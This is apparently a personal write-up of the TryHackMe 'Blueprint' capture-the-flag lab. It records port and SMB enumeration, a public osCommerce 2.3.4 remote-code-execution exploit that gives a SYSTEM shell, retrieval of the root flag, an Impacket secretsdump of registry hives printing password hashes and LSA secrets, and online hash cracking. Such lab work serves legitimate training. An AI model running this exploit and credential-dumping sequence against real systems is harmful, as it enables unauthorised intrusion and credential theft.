initial nmap scan
```
sudo nmap -sV -Pn -p- -T 4 -sS '10.10.16.106'
[sudo] password for gomez22:
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-26 12:40 PDT
Warning: 10.10.16.106 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.16.106
Host is up (0.31s latency).
Not shown: 65506 closed tcp ports (reset)
PORT      STATE    SERVICE      VERSION
80/tcp    open     http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
135/tcp   open     msrpc        Microsoft Windows RPC
139/tcp   open     netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open     ssl/http     Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
445/tcp   open     microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open     mysql        MariaDB (unauthorized)
3483/tcp  filtered slim-devices
6599/tcp  filtered unknown
8080/tcp  open     http         Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
14668/tcp filtered unknown
18512/tcp filtered unknown
22312/tcp filtered unknown
32253/tcp filtered unknown
38976/tcp filtered unknown
39105/tcp filtered unknown
41854/tcp filtered unknown
43743/tcp filtered unknown
44859/tcp filtered unknown
48179/tcp filtered unknown
49152/tcp open     msrpc        Microsoft Windows RPC
49153/tcp open     msrpc        Microsoft Windows RPC
49154/tcp open     msrpc        Microsoft Windows RPC
49158/tcp open     msrpc        Microsoft Windows RPC
49159/tcp open     msrpc        Microsoft Windows RPC
49160/tcp open     msrpc        Microsoft Windows RPC
49735/tcp filtered unknown
54880/tcp filtered unknown
58369/tcp filtered unknown
64623/tcp filtered unknown
Service Info: Hosts: www.example.com, BLUEPRINT, localhost; OS: Windows; CPE: cpe:/o:microsoft:windows
```

smbclient
```
└─$ smbclient -L 10.10.16.106
Password for [WORKGROUP\gomez22]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Users           Disk
        Windows         Disk
```

I found RCE exploits for the oscommerce-2.3.4 version that is running. I used the exploit to get a reverse shell

```
└─$ python3 50128.py http://10.10.16.106:8080/oscommerce-2.3.4/catalog
[*] Install directory still available, the host likely vulnerable to the exploit.
[*] Testing injecting system command to test vulnerability
User: nt authority\system

RCE_SHELL$ ls

RCE_SHELL$ dir
 Volume in drive C has no label.
 Volume Serial Number is 14AF-C52C

 Directory of C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes

09/26/2022  09:24 PM    <DIR>          .
09/26/2022  09:24 PM    <DIR>          ..
04/11/2019  10:52 PM               447 application.php
09/26/2022  09:26 PM             1,118 configure.php
04/11/2019  10:52 PM    <DIR>          functions
               2 File(s)          1,565 bytes
               3 Dir(s)  19,509,338,112 bytes free

RCE_SHELL$ whoami
nt authority\system

```

Since I was able to get an `nt authority\system` shell right away I decided to get the root flag immediately.
Path to root.txt.txt
```
RCE_SHELL$ dir
 Volume in drive C has no label.
 Volume Serial Number is 14AF-C52C

 Directory of C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes

09/26/2022  09:24 PM    <DIR>          .
09/26/2022  09:24 PM    <DIR>          ..
04/11/2019  10:52 PM               447 application.php
09/26/2022  09:28 PM             1,118 configure.php
04/11/2019  10:52 PM    <DIR>          functions
               2 File(s)          1,565 bytes
               3 Dir(s)  19,509,313,536 bytes free

RCE_SHELL$ dir C:\Users
 Volume in drive C has no label.
 Volume Serial Number is 14AF-C52C

 Directory of C:\Users

04/11/2019  11:36 PM    <DIR>          .
04/11/2019  11:36 PM    <DIR>          ..
04/11/2019  11:40 PM    <DIR>          Administrator
03/21/2017  04:30 PM    <DIR>          DefaultAppPool
03/21/2017  04:09 PM    <DIR>          Lab
07/14/2009  05:41 AM    <DIR>          Public
               0 File(s)              0 bytes
               6 Dir(s)  19,509,313,536 bytes free

RCE_SHELL$ dir C:\Users\Administrator
 Volume in drive C has no label.
 Volume Serial Number is 14AF-C52C

 Directory of C:\Users\Administrator

04/11/2019  11:40 PM    <DIR>          .
04/11/2019  11:40 PM    <DIR>          ..
04/11/2019  11:36 PM    <DIR>          Contacts
11/27/2019  07:15 PM    <DIR>          Desktop
04/11/2019  11:36 PM    <DIR>          Documents
04/11/2019  11:45 PM    <DIR>          Downloads
04/11/2019  11:36 PM    <DIR>          Favorites
04/11/2019  11:36 PM    <DIR>          Links
04/11/2019  11:36 PM    <DIR>          Music
04/11/2019  11:36 PM    <DIR>          Pictures
04/11/2019  11:36 PM    <DIR>          Saved Games
04/11/2019  11:36 PM    <DIR>          Searches
04/11/2019  11:36 PM    <DIR>          Videos
               0 File(s)              0 bytes
              13 Dir(s)  19,509,313,536 bytes free

RCE_SHELL$ dir C:\Users\Administrator\Desktop
 Volume in drive C has no label.
 Volume Serial Number is 14AF-C52C

 Directory of C:\Users\Administrator\Desktop

11/27/2019  07:15 PM    <DIR>          .
11/27/2019  07:15 PM    <DIR>          ..
11/27/2019  07:15 PM                37 root.txt.txt
               1 File(s)             37 bytes
               2 Dir(s)  19,509,280,768 bytes free

RCE_SHELL$ type C:\Users\Administrator\Desktop\root.txt.txt
THM{aea1e3ce6fe7f89e10cea833ae009bee}

```
I used this walkthrough to get the needed hash for question #1
https://systemweakness.com/blueprint-tryhackme-ctf-walkthrough-c71c27d6e652


```
└─$ python3 secretsdump.py -sam /home/gomez22/Blueprint/sam.save -security /home/gomez22/Blueprint/security.save -system /home/gomez22/Blueprint/system.save LOCAL
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Target system bootKey: 0x147a48de4a9815d2aa479598592b086f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:549a1bcb88e35dc18c7a0b0168631411:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Lab:1000:aad3b435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DefaultPassword 
(Unknown User):malware
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x9bd2f17b538da4076bf2ecff91dddfa93598c280                  
dpapi_userkey:0x251de677564f950bb643b8d7fdfafec784a730d1                     
[*] Cleaning up...
```

crackstation.net cracked the hash and gave me `googleplus`
